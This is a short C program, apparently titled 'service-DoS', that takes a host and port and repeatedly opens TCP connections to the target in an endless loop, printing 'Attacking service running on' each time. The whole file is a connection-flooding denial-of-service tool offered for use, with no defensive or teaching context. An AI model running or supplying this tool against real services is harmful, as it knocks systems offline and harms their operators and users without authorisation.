#include <stdio.h>
#include <sys/socket.h>
#include <netdb.h>

int main(int argc, char *argv[]) {

    if (argc < 3) {
        printf("Usage: ./service-DoS <host> <port>\n");
        return 0;
    } else {
        int my_socket;
        int connection;

        char *host = argv[1];
        int port = atoi(argv[2]);

        struct sockaddr_in target;

        while(1) {
            my_socket = socket(AF_INET,SOCK_STREAM,0);
            target.sin_family = AF_INET;
            target.sin_port = htons(port);
            target.sin_addr.s_addr = inet_addr(host);

            connection = connect(my_socket, (struct sockaddr *)&target, sizeof target);

            printf("Attacking service running on %s:%d\n", host, port);
        }
    }

    return 0;
}